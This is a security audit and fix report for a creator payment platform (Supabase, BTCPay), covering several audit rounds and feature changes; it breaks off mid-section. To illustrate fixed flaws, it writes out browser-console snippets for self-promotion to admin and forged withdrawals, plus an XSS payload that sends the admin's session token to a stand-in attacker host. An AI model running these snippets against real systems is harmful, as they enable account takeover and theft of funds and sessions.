# CPAY — Audit & Fix Report

Reviewed: 18 migrations, 5 Edge Functions, 7 HTML pages, 1 Cloudflare Worker.
Everything below is fixed in the attached zip unless marked **NOT CHANGED**.

Verification run on the patched code:
- All 18 migrations parse under the real PostgreSQL grammar (`pglast`/libpg_query)
- All 5 Edge Functions compile under `esbuild`
- All inline scripts in all 7 HTML pages pass `node --check`

---

## CRITICAL — money and account takeover

### 1. Any creator could make themselves an admin

`0002` had:

```sql
create policy "update own profile" on profiles for update
using (id = auth.uid());
```

No `WITH CHECK`, no column restrictions. From the browser console, with nothing
but the public anon key:

```js
await supabaseClient.from('profiles')
  .update({ role: 'admin', withdrawal_fee_percent: 0, max_payment_links: 9999 })
  .eq('id', myId);
```

That is full admin: approve your own withdrawals, force BTCPay payouts, read
every creator's wallet details.

**Fixed** — `WITH CHECK` added, plus a `guard_profile_updates()` trigger that
rejects any change to `role`, `email`, `withdrawal_fee_percent`,
`max_payment_links`, `auto_withdraw_enabled`, `buy_rate` or `sell_rate` from a
non-admin. Creators can still edit their display name and wallet fields.

### 2. Withdrawals could be created straight from the browser

`0002` also had an INSERT policy on `withdrawals` whose only condition was
`user_id = auth.uid()`. Every balance check, fee calculation and minimum-amount
rule lived in `request_withdrawal()` — which nothing forced you to call:

```js
await supabaseClient.from('withdrawals').insert({
  user_id: myId, amount_requested: 999999, fee_percent: 0,
  amount_after_fee: 999999, method: 'bkash',
  destination: 'x', status: 'approved'   // straight past the review queue
});
```

**Fixed** — the client INSERT policy is dropped. `withdrawals` can now only be
written by `request_withdrawal()` and `system_queue_withdrawal()`, both
`SECURITY DEFINER`. A second trigger blocks editing `amount_requested`,
`amount_after_fee`, `fee_percent`, `destination` or `user_id` on an existing row.

### 3. Two different balance formulas — the same money paid out twice

The codebase disagreed with itself about what "available balance" means:

| Definition | Used by |
|---|---|
| A: `sum(settled payments) − sum(non-rejected withdrawals)` | `request_withdrawal()`, creator dashboard |
| B: `sum(settled payments where withdrawal_id is null)` | `user-withdraw`, webhook auto-queue |

A manual request under (A) never tagged any payment rows, so (B) still counted
that money as unspent. Withdraw $100 through the dashboard, wait for the next
payment to settle, and the auto-queue creates a *second* withdrawal covering the
same $100.

Model (B) was independently broken in two more ways:
- Withdrawing $5 out of a $500 balance tagged **every** payment row to that
  withdrawal, freezing the other $495.
- A rejected withdrawal never released its tagged payments, so the money was
  gone permanently.

**Fixed** — model (A) is now the only definition, in `get_balance_for()`.
`get_my_balance()` is the creator-facing wrapper the dashboard calls, so the UI
figure and the server figure cannot drift. `user-withdraw` no longer does its
own maths — it calls `request_withdrawal()` with the user's JWT.

### 4. Concurrent withdrawals could both pass the balance check

`0017` tried to lock with `perform 1 from payments where user_id = v_uid and
status = 'settled' for update`. That locks payment rows, not the thing being
contended, and locks nothing at all when the user has no settled rows matching.
Two parallel requests could each see the full balance.

**Fixed** — `request_withdrawal()` and `system_queue_withdrawal()` both take
`select ... from profiles where id = v_uid for update` first, which serialises
every withdrawal path per creator.

### 5. Double-click on "Force BTCPay Payout" sent two real payouts

`/process-withdrawal` read the row, called BTCPay, then wrote `status = 'paid'`
unconditionally. Nothing checked the current status, so two clicks produced two
Lightning payouts for one request.

**Fixed** — `system_claim_withdrawal(id, next_status)` performs the transition as
a single conditional `UPDATE ... WHERE status IN ('pending','approved')` and
returns whether it won. The claim happens *before* the BTCPay call; a losing
caller gets `409 Already processed`. On payout failure the row returns to
`pending` for manual review.

### 6. Stored XSS in the admin panel

Creator-controlled text was interpolated raw into `innerHTML` in the admin
panel: `display_name` (set from signup metadata), `w.destination` (free-text
withdrawal field), `owner_email`, `creator_email`, `link_slug`. A creator
registering with

```
display_name: <img src=x onerror="fetch('https://evil/'+localStorage.getItem('sb-...-auth-token'))">
```

exfiltrates the admin's session the moment the admin opens the Customers tab —
and that session can force payouts.

**Fixed** — every one of those sinks now goes through `escapeHtml` /
`escapeAttr` / new `safeText` / `safeMethod` helpers. The remaining raw
interpolations are UUIDs, booleans and CHECK-constrained status strings.

### 7. Anonymous read of the entire payments table

```sql
create policy "anon can watch invoice status for realtime"
on payments for select to anon using (true);
```

The column grant hid `user_id`, but anyone with the anon key (it is in
`config.js`, by design) could `select` amount, status and expiry for **every
payment ever made** — the whole revenue ledger.

**Fixed** — narrowed to `expires_at > now() - interval '2 hours'`. That is wide
enough for a 60-minute invoice plus its settle event, so Realtime still works,
and all history is private.

---

## HIGH

### 8. Instant Lightning payouts could never succeed

`user-withdraw` inserted `status: "processing"`, but the CHECK constraint on
`withdrawals.status` only allowed `pending|approved|rejected|paid`. Every
instant payout died on a constraint violation and returned a generic 500.

**Fixed** — `processing` added to the constraint.

### 9. Withdrawal method validation was deleted and never replaced

`0017` ran `alter table withdrawals drop constraint if exists
withdrawals_method_check` and also removed the `p_method` check from
`request_withdrawal()`. Any string was accepted as a payout method.

**Fixed** — constraint restored as
`('bkash','nagad','binance','lightning','usdt_bep20','bank')` (added `NOT VALID`
so it cannot fail on legacy rows), and the function validates against the same
list.

### 10. Webhook wrote an unreliable settled amount

`updatePayload.amount_settled = event.amount ?? payment.amount_requested`. The
`InvoiceSettled` payload does not carry a dependable fiat amount — so this was
either `undefined` or, on an overpayment, a BTC-denominated number being written
into a USD column.

**Fixed** — the webhook now fetches the invoice from BTCPay, confirms
`currency === "USD"`, and uses that amount; it falls back to `amount_requested`
otherwise.

### 11. A settled payment could be downgraded to expired

The webhook applied whatever status the event implied. A late `InvoiceExpired`
after `InvoiceSettled` would flip a settled payment back — silently reducing a
creator's balance below money they may already have withdrawn.

**Fixed** — settled is terminal. Early return in the webhook, a conditional
`.neq('status','settled')` on the update, and `admin_mark_payment()` now refuses
to touch a settled row.

### 12. Missing cron secret failed open

```ts
if (req.headers.get("x-cron-secret") !== Deno.env.get("CRON_SECRET"))
```

If `CRON_SECRET` was never set, a request with no header compared
`null !== undefined` — true, so it rejected. But the config was still one typo
away from exposing the full ledger export publicly, and the intent was unclear.

**Fixed** — both `daily-report` and `ledger-backup` now refuse everything when
`CRON_SECRET` is empty. Same guard added to `BTCPAY_WEBHOOK_SECRET`, where the
consequence was worse: HMAC over an empty key is something an attacker can
reproduce, so every forged webhook would have been accepted.

### 13. Live cron secret committed to the repo

`ledger-backup/ledger-backup-trigger.sql` contained
`'x-cron-secret', 'parvezmosharafvu'` and the live project URL, in Git.

**Fixed** — rewritten to read both from Supabase Vault. **The old secret is
burned — rotate it.**

### 14. Customer emails committed to the repo

`ledger-backups/*.json` are real production snapshots containing real email
addresses and the admin account's identity, and `ledger-backup/index.ts` selects
`email` on every run. If that repo is public, this is a continuous PII leak.

**Fixed** — `email` removed from the export (`id` is enough to rejoin on
restore). **NOT CHANGED:** the five existing snapshot files are left in place —
deleting them from the working tree does not remove them from Git history. If
the repo is or ever was public, treat those addresses as disclosed.

### 15. A creator could rewrite the admin's messages

The `support_messages` UPDATE policy had a `USING` clause and no `WITH CHECK`.
The UI hid the Edit button on admin messages; the API did not.

**Fixed** — `WITH CHECK` added plus `guard_message_updates()`, which allows
flipping read/delete flags on any message in your own thread but only editing
text you wrote yourself, and blocks changing `sender` or `user_id`.

### 16. Reserved slugs were never enforced

The reserved-name list existed in three JavaScript files and was binding in
none of them. A creator could POST `slug: 'admin'` to PostgREST directly and
shadow `/admin` on every payment domain.

**Fixed** — `validate_link_slug()` trigger enforces the format
`^[a-z0-9][a-z0-9-]{2,48}[a-z0-9]$` and the reserved list in the database.

---

## MEDIUM

### 17. `create-invoice` would 401 in production
Deployment docs only mentioned deploying `btcpay-webhook`. `404.html` calls
`create-invoice` with no `Authorization` header, so without `--no-verify-jwt`
every payment attempt fails. **Fixed** in `docs/DEPLOYMENT.md`, with the reason
each function gets the flag it gets.

### 18. No abuse limit on invoice creation
`create-invoice` is unauthenticated by design. Nothing stopped a script from
spinning up unlimited real invoices on the merchant's node. **Fixed** — max 10
invoices per link per minute, returns `429`.

### 19. Orphaned BTCPay invoices
If the DB insert failed after BTCPay created the invoice, the merchant was left
with a live invoice CPAY had no record of. **Fixed** — the invoice is
archived on insert failure.

### 20. `Number(body.amount)` accepted junk
`!amount || amount < 1` let some `NaN`/`Infinity` shapes through, and fractional
cents reached BTCPay as an amount the ledger could never match. **Fixed** —
`Number.isFinite` plus rounding to 2dp. Slug format validated too.

### 21. BTCPay error bodies returned to the browser
`return json({ error: "...", detail: errText })` leaked store/node internals to
any visitor. **Fixed** — logged server-side, generic message returned.

### 22. `is_admin()` had no pinned `search_path`
Every other `SECURITY DEFINER` function in the repo pins it; this one didn't,
leaving it open to a search-path hijack. **Fixed.**

### 23. `app_settings` was world-readable
`using (true)` exposed `profit_margin_percent`, `exchange_rates` and the
auto-withdraw threshold to anonymous visitors. **Fixed** — anon sees only
`platform_notice` and `site_domain`; creators see the handful of keys their
pages actually render; admins see everything.

### 24. Link limit bypass
`0017` changed the limit to count only *active* links, but the trigger still
fired only on INSERT. Deactivate one, create a new one, reactivate the old one,
and you sit above the limit forever. **Fixed** — trigger now fires on
`INSERT OR UPDATE`.

### 25. `admin_mark_payment` accepted any amount
Including negative numbers, which would corrupt every balance derived from
`sum(amount_settled)`. **Fixed** — range check, row lock, already-settled guard.

### 26. "Clear history" did nothing visible to creators
`0017` made it a soft delete via `deleted_by_creator`, but the dashboard never
filtered on the flag. **Fixed.**

### 27. `w.method.toUpperCase()` crashed the whole list
`method` is nullable and the auto-queue could produce rows without one. One null
threw inside `.map()` and blanked the entire withdrawals list in both panels.
**Fixed** via `safeMethod()`.

### 28. Auto-withdraw toggle showed the wrong state
`cu.auto_withdraw_enabled !== false` treated `null` as enabled, so creators who
had never been granted instant Lightning appeared in the admin panel as already
granted. **Fixed** to `=== true` (the column defaults to `false`).

### 29. Auto-queue could create unpayable requests
The webhook queued withdrawals with `destination: "Not set — creator must
update"` and `method: "usdt_bep20"` regardless of what the creator had
configured. **Fixed** — `system_queue_withdrawal()` resolves the destination
from the creator's saved wallet for that method and skips queueing entirely if
there isn't one, leaving the balance withdrawable instead.

---

## NOT CHANGED — needs your decision

**A. The admin profit formula.** `admin_global_stats()` computes

```sql
total_admin_profit  = total_settled × (margin/100) / 2.0
calculated_node_balance = total_settled × (1 + margin/100)
```

The `/ 2.0` and the `1 +` both look deliberate but neither is documented, and I
won't quietly change money maths. Two things to note: the node-balance formula
grows the balance as settlements rise, which reads backwards for a figure meant
to represent funds held; and this profit number disagrees with the one
`daily-report` writes into `daily_stats`, which uses
`total_settled × (sell_rate − buy_rate)`. Since `0017` seeds both rates at
`133.0`, that second formula currently returns exactly **0** — so the admin
panel's Earnings tab shows zero profit per day while the header stat shows a
non-zero number. Pick one definition.

**B. Anon Realtime is still a two-hour window.** Narrowed, not eliminated —
someone with the anon key can still enumerate currently-live invoices. Closing
it fully means dropping the anon policy and polling `get_invoice_public()` every
few seconds on the invoice page instead. That's a real trade-off; say the word
and I'll switch it.

**C. `payments.withdrawal_id` is now unused.** Left in place so existing rows
and the ledger backups stay readable. Safe to drop later.

---

## Do these before redeploying

1. Run migration `0018_security_and_integrity_fixes.sql`.
2. Rotate `CRON_SECRET` — the old one is in Git history.
3. Make the GitHub repo private if `ledger-backup` is enabled.
4. Redeploy all five Edge Functions with the flags in `docs/DEPLOYMENT.md`.
5. Check for damage already done:

```sql
-- anyone who promoted themselves before 0018
select id, email, role, withdrawal_fee_percent from profiles where role = 'admin';

-- withdrawals that never came from request_withdrawal()
select * from withdrawals where fee_percent = 0 or amount_after_fee > amount_requested;

-- creators paid more than they earned
select p.email, b.* from profiles p, get_balance_for(p.id) b where b.available < 0;
```

6. Run the regression queries in `docs/DEPLOYMENT.md` §6 as a non-admin user.

---

## Re-audit — 2026-08-27

Re-reviewed the whole tree after the reformat, with 0003 and 0018 read line by line.

**Confirmed working in production**, from the 2026-08-26 ledger snapshot:
`request_withdrawal` produced a real bkash withdrawal that reached `paid`,
which means `system_claim_withdrawal` and `/process-withdrawal` both work end
to end. The snapshot also has no `email` field, so the PII fix is deployed.

### Fixed in migration 0019

**19a. `/admin-mark-settled` was broken — a regression I introduced.**
0018 moved the bounds and already-settled checks into `admin_mark_payment()`,
and I changed the webhook route to call it. But that route calls it with the
**service role** client, and a service-role JWT has no `sub` claim, so
`auth.uid()` is null, `is_admin()` returns false, and the admin panel's
"Approve" button on a stuck payment failed with `Not authorized`.
`admin_mark_payment()` now also accepts the service role (that route already
verifies an admin JWT in code first), and `btcpay-webhook` calls it with the
admin's own client instead.
The "Mark expired" button was never affected — it calls the same function
directly with the admin's JWT.

**19b. anon still had EXECUTE on every `admin_*` function.**
Migrations 0008 and 0013-0015 only did `revoke all ... from public`. In a
Supabase project, `anon` and `authenticated` are granted EXECUTE explicitly via
`ALTER DEFAULT PRIVILEGES`, not through `PUBLIC` — so revoking PUBLIC left both
roles untouched. Not exploitable: every one of those functions opens with
`if not is_admin() then raise`. Tightened anyway, along with revoking API access
to the trigger functions.

### Checked and correct

- **0003.** `request_withdrawal` and `admin_global_stats(date,date)` from this
  file are dead — superseded by 0017/0018 and dropped respectively.
  `get_invoice_public` and `get_link_preview` are the live versions and are
  sound; `get_link_preview`'s grant is now explicit for both roles.
- **0018.** Balance model, row locking, both guard triggers, the claim function,
  the narrowed anon Realtime window, the link-limit and slug triggers, and the
  `app_settings` split all re-read and correct. The `get_balance_for` revoke now
  includes `authenticated`.
- HTML tag balance valid on all 7 pages after the reformat; every security fix
  from the previous pass is still present. All 19 migrations parse under the
  real PostgreSQL grammar, all 5 Edge Functions compile.

### Still open

- **DB/repo drift.** The project has two functions that exist in no migration:
  `public.rls_auto_enable` and `public.slug_exists`. Read their bodies
  (`select prosrc from pg_proc where proname in ('rls_auto_enable','slug_exists')`)
  and either add them to a migration or drop them. `rls_auto_enable` is worth
  reading first — a function that touches RLS and is not in version control is
  the kind of thing that quietly undoes a policy.
- **0006 seeds `exchange_rates` at buy 1.0 / sell 1.0.** `daily-report` computes
  `total_settled × (sell − buy)`, so every row written to `daily_stats` has
  `total_admin_profit = 0` and the admin Earnings tab shows nothing. Item A in
  the section above is still the decision to make.
- **`get_invoice_public` ignores the two-hour window** that 0018 applied to the
  anon `payments` policy. It is `SECURITY DEFINER`, so anyone holding an old
  payment UUID can still read that invoice's amount and status. UUIDs are
  unguessable and this keeps the success screen working on a late reopen, so it
  was left alone — but the two paths are deliberately inconsistent.
- **Client/DB slug rules differ.** `dashboard.html` rejects slugs under 3
  characters; `validate_link_slug()` requires 4. A 3-character slug passes the
  browser check and then fails with a database error.
- Do not press **Save** on the Data API "Exposed functions" screen. The orange
  entries are locked on purpose; saving rewrites grants from the checkbox state
  and would undo both the `payments` column-level grant and these revokes.

---

# Round 2 — full-system audit, September 2026

Reviewed: 48 migrations, 8 Edge Functions, 8 HTML pages, 1 Cloudflare Worker.

## Critical — silent data loss

### C1. The ledger backup had stopped backing up

`ledger-backup` called `.select("*")` with no `.range()`. PostgREST caps
every response at 1000 rows, and the query sorted `created_at` **ascending**
— so once the ledger passed a thousand payments it kept the oldest thousand
and dropped every newer one.

The committed snapshots showed it happening:

```
2026-09-01 :  654 rows | newest payment 09-01 10:51
2026-09-02 :  897 rows | newest payment 09-02 10:59
2026-09-03 : 1000 rows | newest payment 09-03 02:47   ← hit the cap
2026-09-04 : 1000 rows | newest payment 09-03 02:47   ← unchanged, 24h later
```

**Fixed:** paginated `fetchAll()`, plus a `COUNT` verification that aborts
the commit and alerts if the snapshot is short. A backup that quietly stops
is worse than no backup, because nothing looks wrong.

### C2. Creators were shown an understated lifetime total

`fetchPayments()` had the same 1000-row cap, and `computeStats()` and
`renderTiers()` both summed that capped array. A creator with 2213 payments
saw a total built from 1000 of them — and a tier badge to match.

**Fixed:** migration 0042 adds `get_my_totals()`. Every figure on the card
is now counted in the database. Verified against a capped list: shows
`$97,327.61 / 2213` where the old code showed `$40,000 / 1000`.

### C3. Two different definitions of "a day"

`daily-report` summed rows fetched from PostgREST (same cap) and bucketed by
**midnight** Dhaka, while every live view on the site bucketed **5pm–5pm**.
Archive and screen disagreed about which day a payment belonged to.

**Fixed:** migration 0043 adds `daily_totals_for_cycle()`. The sums happen in
SQL with no row limit, on the one cycle boundary the whole system now shares.

## High — the global Lightning switch did nothing

`user-withdraw` checked only the per-creator `auto_withdraw_enabled` flag,
never the global master switch. The admin panel's own help text said *"Off
here means no creator gets an instant payout, whatever their own profile
says"* — which was not true. Creators with their own flag on kept receiving
instant payouts after the master switch was turned off.

**Fixed:** the server now requires both, and the dashboard's copy of the
check fails closed instead of open.

## Medium

| | |
|---|---|
| No index on `payments(created_at)` despite both panels ordering by it | Fixed in 0044 |
| `prune_webhook_events()` existed but its cron schedule was only a comment | Scheduled in 0044 |
| Statement timeout (57014) on a `support_messages` UPDATE | Lock contention; 0034 had already indexed it, and the 0044 indexes remove the slow sorts it was queueing behind |
| Message threads sorted ascending with no limit — long threads would hide the newest messages | Fixed: newest-first with an explicit cap, reversed for display |

## What was added

- **`reconcile`** — the only job that looks outside CPAY. Compares
  BTCPay's settled invoices against the ledger daily and names the specific
  invoices that never arrived. Read-only: it reports, a human decides.
- **`health`** — five checks every 15 minutes, alerting on genuine faults
  and staying quiet when there is simply no traffic. Returns 503 when
  unhealthy so an uptime monitor can page on the status code alone.
- **`audit_log`** (0047) — append-only record of fee, role, assignment and
  instant-payout changes, with old and new values. No update or delete
  policy exists for anyone, including admins.
- **Server-side pagination** (0046) for both payment feeds, with an honest
  "Showing N of TOTAL".
- **CSV export** for creators, fetching all pages rather than exporting
  whatever is on screen.
- **Idle session timeout** on the two staff panels.
- **CI** (`.github/workflows/verify.yml`) running every check that was
  previously done by hand.

## Found by the CI on its first run

Worth recording, because it justifies the CI existing:

1. `daily-report` and `reconcile` both read properties off an untyped
   `.rpc().maybeSingle()` result, which TypeScript infers as `{}`.
   `deno check` rejects it; **esbuild does not, because it strips types
   rather than checking them**. The verification used during development
   was the wrong tool.
2. The workflow itself had an indented heredoc terminator inside a shell
   loop (which never terminates) and created none of the Supabase roles,
   so all 104 `grant … to authenticated` statements would have failed.

## Verified healthy

- 48 migrations parse under the real PostgreSQL grammar
- 8 Edge Functions build; the two type errors above are fixed
- 8 pages pass HTML, JavaScript, element-reference and handler checks
- Every `rpc()` call matches its SQL definition
- RLS is enabled on every table
- Every `SECURITY DEFINER` function sets `search_path`
- `request_withdrawal()` serialises with `FOR UPDATE`;
  `system_claim_withdrawal()` is an atomic compare-and-swap
- CSP and security headers cover every origin the pages use

## Still open

- Archival of payments older than a year, and a materialised view for the
  daily rollups — both premature at current volume
- Two-factor authentication for admin and moderator accounts
- A staging environment for testing migrations before production
- Creator onboarding flow, customer receipts, login rate limiting

---

# Round 3 — external audit review, September 2026

An independent AI review (Manus) of `cpay-fixed.zip` raised five
findings. Each was verified against the actual function bodies before
acting on it — one did not hold up, four did.

## Rejected

**"Mixed-case links are broken because `validate_link_slug()` lowercases
new slugs."** Checked the trigger directly: it calls `lower()` exactly
once, inside the reserved-name comparison (`if lower(new.slug) in (...)`),
and never assigns the result back to `new.slug`. The slug itself is only
`trim()`'d. `AliceSmith` is stored as `AliceSmith`, and `get_link_preview()`
already does an exact, case-sensitive match by design — that is the whole
mechanism that lets `/sophia`, `/Sophia`, `/SophiaK` and `/Sophia-K` be
four distinct links on four distinct rates. Nothing changed here.

## Confirmed and fixed

**`clear_message_thread()` still hard-deleted.** 0049 added
`hide_message()` for single messages and dropped the DELETE policy, but
never touched the "Clear entire conversation" function — its admin
branch still ran `delete from support_messages`. The one button that
clears an entire thread could bypass the soft-delete guarantee the rest
of that migration existed for.

**Fixed in 0050:** the admin branch now sets `deleted_by_admin = true`
instead of deleting, and the action is recorded in `audit_log`.

**Manual settlement had no ceiling relative to what was requested.**
`admin_mark_payment()` checked that a manually-entered settlement amount
was positive and under 100,000 — never against that payment's own
`amount_requested`. A $1 invoice could be marked settled for $50,000,
which `get_balance_for()` would add to the creator's withdrawable balance
in full.

**Fixed in 0050:** capped at 102% of `amount_requested` (a small
allowance for a payer who rounds up), with the specific numbers in the
error message. Verified against the exact $1-requested / $50,000-settled
scenario from the finding — now rejected — alongside the boundary
($1 requested / $1.02 settled passes, $1.03 does not).

**CORS fallback host normalization did not match the primary path.**
Both `btcpay-webhook` and `user-withdraw` reduce `ALLOWED_ORIGINS` entries
to bare lowercase hosts on the normal path, but the fallback taken when
the `site_domains` lookup fails returned the raw, un-normalized secret
value. With a full-URL secret (`https://pay.example.com`), the working
path compared `pay.example.com` while the fallback compared
`https://pay.example.com` — never equal, so every legitimate browser
request lost its CORS header for as long as the database hiccup lasted.
Not an auth bypass; an availability bug, and one that only appears at
exactly the moment a payout or a payment matters most.

**Fixed:** a single `normalizeOriginHost()` used on every path in both
functions — static origins, database hosts, and the fallback. Verified
the normal and fallback paths now produce identical sets, and that
`https://Pay.Example.com/`, `pay.example.com` and
`HTTPS://PAY.EXAMPLE.COM` all normalize to the same value.

**README's migration range was stale.** Said `0001 → 0048`; `0049`
already existed. Updated to `0001 → 0050`.

## Verified healthy (unchanged from Round 2)

All 50 migrations parse clean, all 8 Edge Functions compile, all 8 pages
pass static checks, every `rpc()` call matches its SQL definition.

---

# Feature — hide small settled payments (creator/moderator), September 2026

New request, not a bug fix: an admin-controlled toggle that hides settled
payments at or below a threshold ($10 by default) from the creator
dashboard and the moderator panel, everywhere payment data appears —
while the admin panel always shows the true, complete picture regardless
of the toggle.

## Design decision, stated up front

**Withdrawable balance is never filtered.** `get_balance_for()` and
`get_my_balance()` are untouched. The money behind a hidden payment is
exactly as real and exactly as withdrawable as before — this is a
display filter, not a financial one. Folding the threshold into balance
too would mean a creator could become unable to withdraw money that is
genuinely theirs because of a visibility setting, which is a much larger
and more dangerous change than "don't show me these on screen," and
wasn't what was asked. If available balance should also exclude these
payments, that's a separate, explicit decision.

One consequence of this choice: while the toggle is on, "Available
balance" can read higher than "Total earned" for a creator whose income
includes small payments — both figures are correct, they are just
answering different questions (what's shown vs. what's truly owed).

## A near-miss worth recording

Writing migration 0051, three of the seven functions being modified were
initially rewritten from memory rather than from their actual current
definitions — `staff_list_payments()`, `staff_global_stats()`, and
`staff_customer_totals()`. All three came out wrong: wrong parameter
names (`p_time_filter` instead of the real `p_time`), a missing required
parameter pair (`p_start`/`p_end` on `staff_global_stats`), and for
`staff_customer_totals()` an entirely different, invented set of return
columns that didn't match what `moderator.html` actually reads
(`c.display_name`, `c.settled`, `c.pending`, `c.withdrawn` — none of
which existed in the invented version).

Caught before shipping by writing a small script that extracts every
function's real parameter list and return-column list from the
migrations that predate 0051, and diffs that against what 0051 was about
to ship — rather than trusting memory of having "just read" those files
minutes earlier. Rewrote all three against their actual bodies, re-ran
the same diff, confirmed all seven functions now match exactly.

This is the same category of mistake that caused the original 42P13
failure much earlier in this project (changing a function's signature
without a matching `DROP FUNCTION` first, or in this case, inventing a
signature that never matched what existed) — and a reminder that "I read
this file two minutes ago" is not the same guarantee as "I am reading it
right now, in this response."

## What changed

**Migration 0051** adds `hide_small_payments_enabled` and
`hide_small_payments_threshold` to `app_settings`, a
`small_payment_threshold()` helper (returns `-1` — a permanent no-op —
when the toggle is off), and re-defines seven functions with one added
condition each: `not (status = 'settled' and amount_settled <= threshold)`.

| Function | Surface | What's filtered |
|---|---|---|
| `get_my_payments()` | Creator dashboard | Payment list rows |
| `get_my_totals()` | Creator dashboard | "Total earned", settled count (never `available`) |
| `my_daily_settled()` | Creator dashboard | Daily 5pm-5pm figures |
| `staff_list_payments()` | Moderator panel | Payment list rows |
| `staff_global_stats()` | Moderator panel | Settled total, payment count |
| `staff_customer_totals()` | Moderator panel | Per-creator settled total/count (not pending/expired/withdrawn) |
| `staff_daily_settled()` | Moderator panel | Daily 5pm-5pm figures, per creator |

Deliberately untouched: `admin_list_payments()`, `admin_global_stats()`,
`admin_daily_settled()`, `daily_totals_for_cycle()` (used by
`daily-report` and `reconcile`), `get_balance_for()`, `get_my_balance()`.
`reconcile` in particular compares against BTCPay's real numbers —
filtering that would manufacture fake mismatches against a system that
has no idea this toggle exists.

**`admin.html`** gains the toggle and a threshold input in the existing
Global switches panel, using the same `saveGlobalToggle()` pattern the
other two switches already use.

No changes to `dashboard.html` or `moderator.html` — every RPC call site
keeps its exact existing signature, so the filter applies transparently
once the migration is deployed.

## Verified

- All 7 function signatures diffed byte-for-byte against their real
  pre-0051 definitions: all match.
- Confirmed by direct search that `admin_list_payments`,
  `admin_global_stats`, `admin_daily_settled`, `daily_totals_for_cycle`,
  `get_balance_for`, and `get_my_balance` are none of them redefined in
  0051 — only mentioned in comments explaining why.
- Rendered the dashboard with the filter simulated: a $5 and a $10.00
  settled payment vanish from the list; a $10.01 one (correct boundary)
  and a $50 one remain; a $3 *pending* payment is never touched. Total
  earned reflects only the visible payments ($60.01); Available balance
  reflects the true total including the hidden ones ($75.01).
- 51 migrations parse clean, all 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition.

---

# Feature — soft delete for payment links, September 2026

The last item from the original Tier 4 backlog ("soft delete for links
and messages") — messages were finished in 0049; links were not.

## The problem

`admin_delete_link()` ran a hard `DELETE` on `payment_links`. The foreign
key (`payment_link_id ... on delete set null`) meant no payment record
was ever lost, but every payment that came through a deleted link
permanently lost its link context — the old function's own comment said
as much: "only lose the slug they came in on... shows a dash for those."

## The fix

Deletion is now non-destructive at the row level. `admin_delete_link()`
marks the row (`deleted_at`, `is_active = false`) instead of removing
it, so every join that already reads `payment_links` — the creator's own
payment list, the admin panel, the moderator panel — keeps showing which
link a payment came from, deleted or not.

The slug is freed for reuse in the same update, by rewriting it to a
mangled, guaranteed-unique value (`<original, truncated>--deleted-<8 hex
chars of the link's own id>`) rather than by loosening the column's
`unique not null` constraint into a partial index — a much larger change
for the same outcome. Verified the math holds at the true worst case: a
50-character slug (the maximum this system allows) mangles to exactly 50
characters, still inside the format trigger's own limit.

Five other functions gained an explicit `deleted_at is null` guard
(`get_link_preview`, `system_link_for_invoice`, `link_style_options`,
`admin_list_payment_links`) — technically redundant, since a mangled
slug already stops matching lookups by its original name on its own, but
made explicit anyway so correctness never quietly depends on remembering
that the mangling is what's actually doing the work.

## Verified

- All 5 touched functions' signatures diffed against their real,
  pre-0052 definitions (parameters and return columns) — confirmed
  identical. The first diff attempt used a checker that reported false
  positives by matching the *first* occurrence of each function across
  the migration history rather than the *last* (the one that actually
  wins under `CREATE OR REPLACE`); corrected before trusting the result.
- Slug-mangling length traced through the trigger's own regex at every
  boundary case, including the true worst case (a 50-character slug).
- Traced a full lifecycle by hand: link deleted, payment's
  `payment_link_id` unchanged, a join on it still resolves to the
  original display name, the original slug becomes available for a new
  link, the mangled slug passes the format trigger.
- `dashboard.html`'s own link list gained `.is('deleted_at', null)` so a
  deleted link disappears from the creator's view exactly as before.
- `admin.html`'s delete-confirmation warning text updated — it
  previously said payments "will no longer show which link was used,"
  which stopped being true.
- 52 migrations parse clean, 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition.

## Explicitly not built

No "trash" or "restore" UI. Nobody asked for a way to browse or recover
deleted links — the point was that payment *history* stays intact, not
that a deleted link should be manageable again. If restoring a
specific deleted link is ever wanted, that's a distinct, small feature
to ask for by name.

---

# Correction — threshold boundary and withdrawable balance, September 2026

Two changes to 0051/0052's "hide small settled payments" feature,
requested by the owner after seeing it running.

## 1. Boundary: was "at or below $10", should be "strictly under $10"

0051 hid anything with `amount_settled <= threshold`, so $10.00 exactly
was hidden. The owner's correction: only amounts genuinely *under* $10
should ever be affected — $10.00 is a real payment.

Fixed by taking the exact seven function bodies 0051 shipped and
changing only `<= v_hide_at` to `< v_hide_at` in each, verified against
the live signatures to confirm nothing else in any of the seven changed.

## 2. Withdrawable balance now excludes them too

0051 deliberately left `get_balance_for()` untouched, reasoning that a
display filter should never reduce money a creator can actually
withdraw. The owner's correction, with the reasoning behind it: payments
this small are not real creator earnings to begin with — they are what
a client sends to test that a payment method works before attempting
something larger elsewhere (card-testing / probing), not genuine
revenue. That money was never really the creator's to withdraw, so it
should be excluded from the balance calculation the same way it is
excluded from everything else.

`get_balance_for()` is the one function both `request_withdrawal()`
(manual withdrawals) and `system_queue_withdrawal()` (instant
auto-payout) already read their `available` figure from — confirmed by
tracing both call sites directly. Changing `get_balance_for()` alone
means both paths correctly stop offering this money, without either of
those two functions needing to change.

Still gated by the same `hide_small_payments_enabled` toggle as
everything else in this feature — turning it off restores the original
behaviour everywhere, balance included. Admin is unaffected either way:
no admin-facing function reads `get_balance_for()`, so this change never
touched the admin panel's own view of anything.

## Verified

- All 8 touched functions' signatures (the 7 from 0051, plus
  `get_balance_for`) diffed against what is already live — confirmed
  byte-identical apart from the one operator.
- Boundary tested at $9.98 / $9.99 / $9.999 / $10.00 / $10.01: the first
  three excluded, the last two counted — exactly the intended line.
- Confirmed by direct search that `request_withdrawal` and
  `system_queue_withdrawal` are not redefined in this migration (only
  referenced in its explanatory comments) — the fix reaches them purely
  through the function they already call.
- 53 migrations parse clean, 8 Edge Functions still build, frontend
  static checks pass, every `rpc()` call matches its SQL definition,
  admin-facing functions confirmed untouched.

---

# Four items, September 2026

## 1. Admin's Load More reset itself every 15 seconds

The auto-refresh timer called `loadAllPayments(false)`, which reset
`adminPayOffset` to 0 and re-fetched only the first page — discarding
however many "Load more" clicks the admin had made, every 15 seconds.

Rewritten as a `mode` parameter (`'reset' | 'more' | 'refresh'`). A
refresh now re-fetches exactly as many rows as are already loaded,
looping in `admin_list_payments()`'s own 200-row page-size ceiling if
needed, and replaces the set in place — so scroll depth survives
indefinitely, not just up to 200. Verified at 300 rows (single page over
the ceiling) and 500 rows (three chunked fetches): both preserved fully,
with no duplicate ids either time.

## 2. Threshold toggle now has a suppression hook for future alerts

